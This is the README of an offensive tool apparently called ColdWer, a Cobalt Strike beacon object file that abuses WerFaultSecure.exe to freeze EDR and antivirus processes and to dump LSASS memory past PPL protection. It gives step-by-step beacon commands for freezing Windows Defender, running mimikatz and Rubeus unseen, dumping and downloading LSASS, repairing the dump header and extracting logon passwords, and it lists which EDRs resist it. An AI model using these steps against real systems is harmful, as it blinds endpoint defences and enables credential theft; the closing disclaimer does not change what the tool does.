<p align="center">
  <img src="https://img.shields.io/badge/ColdWer-BOF-blue?style=for-the-badge" alt="ColdWer"/>
  <br>
  <i>A cold war on your endpoint.</i>
</p>

<p align="center">
  <a href="https://github.com/0xsh3llf1r3/ColdWer/stargazers"><img src="https://img.shields.io/github/stars/0xsh3llf1r3/ColdWer?style=social" alt="Stars"></a>
  <a href="https://github.com/0xsh3llf1r3/ColdWer/network/members"><img src="https://img.shields.io/github/forks/0xsh3llf1r3/ColdWer?style=social" alt="Forks"></a>
  <a href="https://github.com/0xsh3llf1r3/ColdWer/blob/main/LICENSE"><img src="https://img.shields.io/github/license/0xsh3llf1r3/ColdWer" alt="License"></a>
</p>

---

# 🥶 ColdWer

**ColdWer** leverages WerFaultSecure.exe PPL bypass to freeze EDR/AV processes and dump LSASS memory on modern Windows systems.


```
C O L D W E R
        └─┴─┴── WerFaultSecure
    └─┴──────── LSASS Dump
└─┴──────────── Cold (Freeze)
```

> *Freeze your EDR/AV. Extract what you need. Stay cold.*

---

## 👤 Author

**Sh3llf1r3** ([@0xsh3llf1r3](https://github.com/0xsh3llf1r3))

---

## 🙏 Credits

This project builds upon research by **TwoSevenOneT** ([@TwoSevenOneT](https://x.com/TwoSevenOneT)):

| Project | Description |
|---------|-------------|
| [EDR-Freeze](https://github.com/TwoSevenOneT/EDR-Freeze) | Original EDR freeze technique |
| [WSASS](https://github.com/TwoSevenOneT/WSASS) | LSASS dump via WerFaultSecure |

**All credit for the underlying techniques goes to TwoSevenOneT.**

---

## 🔥 Features

| Feature | Description |
|---------|-------------|
| ❄️ **Freeze** | Put EDR/AV processes into a coma state |
| 🔓 **Dump** | Extract LSASS memory bypassing PPL |
| 🛡️ **PPL Bypass** | Leverage WerFaultSecure.exe at WinTcb level |
| ⚡ **Fast** | Inline BOF execution |
| 🎯 **Manual Control** | You decide when to freeze and unfreeze |

---

## 🚀 Getting Started

### 📋 Prerequisites

- Cobalt Strike 4.x
- High integrity beacon (Administrator/SYSTEM)

<br>

### 💾 Installation

1. Clone the repository:

```bash
git clone https://github.com/0xsh3llf1r3/ColdWer.git
```

2. Load the aggressor script in Cobalt Strike:
  - Go to **Cobalt Strike → Script Manager**
  - Click **Load**
  - Select `cw/coldwer.cna`

<br>

### 📦 Building from Source

```bash
# Navigate to source directory
cd src/

# Compile BOF (requires MinGW)
make

# Or manually:
x86_64-w64-mingw32-gcc -c coldwer.c -o ../cw/coldwer.o
```

<br>


### 📥 Quick Download

1. Go to [Releases](https://github.com/0xsh3llf1r3/ColdWer/releases)
2. Download `coldwer.o` and `coldwer.cna`
3. Place both in the same folder
4. Load `coldwer.cna` in Cobalt Strike

---

## 🖥️ Usage

### ❄️ Freeze EDR/AV

```bash
# Find Windows Defender PID
beacon> ps

# Freeze the process
beacon> cw-freeze 1337

# Execute your commands while EDR/AV is frozen
beacon> mimikatz sekurlsa::logonpasswords
beacon> execute-assembly /tools/Rubeus.exe triage

# Unfreeze when done
beacon> cw-unfreeze
```

### 🔓 Dump LSASS

```bash

# Step 1: Upload Win8.1 WerFaultSecure.exe
beacon> cd C:\Windows\Temp
beacon> upload /path/to/bin/wfs.exe

# Step 2: Find LSASS PID
beacon> ps

# Step 3: Dump LSASS
beacon> cw-dump 314 C:\Windows\Temp\wfs.exe

# Step 4: Download the dump
beacon> download C:\Windows\Temp\lsass.dmp

```
### 🔧 After Download

Change the file header to restore the minidump format:

| Original (PNG) | Change to (MDMP) |
|----------------|------------------|
| `89 50 4E 47`  | `4D 44 4D 50`    |

Restore Header Commands:

| Method | Command |
|--------|---------|
| Python | `open('lsass.dmp','r+b').write(b'MDMP')` |
| Bash | `printf '\x4d\x44\x4d\x50' \| dd of=lsass.dmp bs=1 count=4 conv=notrunc` |
| PowerShell | `$f=[IO.File]::Open("lsass.dmp","Open","Write");$f.Write([byte[]](0x4D,0x44,0x4D,0x50),0,4);$f.Close()` |




Then parse with Mimikatz:

```
mimikatz# sekurlsa::minidump lsass.dmp
mimikatz# sekurlsa::logonpasswords
```

---

## 📋 Commands

| Command | Description |
|---------|-------------|
| `cw-freeze <PID> [Path]` | Freeze process |
| `cw-unfreeze` | Unfreeze previously frozen process |
| `cw-dump <PID> <Path>` | Dump LSASS memory |

  
### 📝 Examples

```bash
# Freeze with default path
beacon> cw-freeze 1337

# Use custom WerFaultSecure.exe
beacon> cw-freeze 1337 C:\Windows\Temp\wfs.exe

# Dump LSASS
beacon> cw-dump 314 C:\Windows\Temp\wfs.exe

# Unfreeze when done
beacon> cw-unfreeze
```

---

## ✅ Supported Targets

| Target | Status |
|--------|--------|
| Windows Defender (MsMpEng.exe) | ✅ Works |
| LSASS (lsass.exe) | ✅ Works |
| Other PPL processes | ✅ Works |

---

## ⚠️ Limitations

**Does NOT work against EDRs with kernel-mode self-protection:**

| EDR | Status |
|-----|--------|
| Elastic Endpoint | ❌ Blocked |
| CrowdStrike Falcon | ❌ Blocked |
| SentinelOne | ❌ Blocked |
| Carbon Black | ❌ Blocked |

---

## ⚙️ How It Works

```
1. 🚀 Launch WerFaultSecure.exe as PPL (WinTcb level)
                    ↓
2. 🎯 WerFaultSecure attaches to target process
                    ↓
3. ⏸️  MiniDumpWriteDump suspends all target threads
                    ↓
4. 🥶 Suspend WerFaultSecure itself → Target stays frozen
                    ↓
5. ✅ Execute your commands (EDR/AV can't see!)
                    ↓
6. 🔥 Terminate WerFaultSecure → Target unfreezes
```

### 🔑 Why Win8.1 WerFaultSecure?

| Version | Output |
|---------|--------|
| Windows 10/11 | Encrypted dump only |
| Windows 8.1 | **Raw unencrypted dump** |

---

## 🔍 Troubleshooting

| Error | Cause | Solution |
|-------|-------|----------|
| File not found | Invalid path | Check WerFaultSecure.exe path |
| Access denied | Low privileges | Run as Administrator/SYSTEM |
| Invalid signature | Unsigned binary | Use properly signed WerFaultSecure.exe |
| Process does not exist | Wrong PID | Verify PID with ps command |
| Target protected | Kernel protection | EDR has self-protection (not bypassable) |
| Already frozen | State stuck | Run cw-unfreeze first |

---

## ⚖️ Disclaimer

```
⚠️ FOR AUTHORIZED SECURITY TESTING ONLY

This tool is intended for:
- Authorized penetration testing
- Red team operations with written permission
- Security research in controlled environments

The author is not responsible for any misuse or damage caused by this tool.
Unauthorized access to computer systems is illegal.
```

---

## 📜 License

MIT License - See [LICENSE](LICENSE)

---

<p align="center">
  <b>🥶 Stay Cold. Stay Quiet. 🥶</b>
  <br><br>
  ⭐ Star this repo if you find it useful! ⭐
</p>
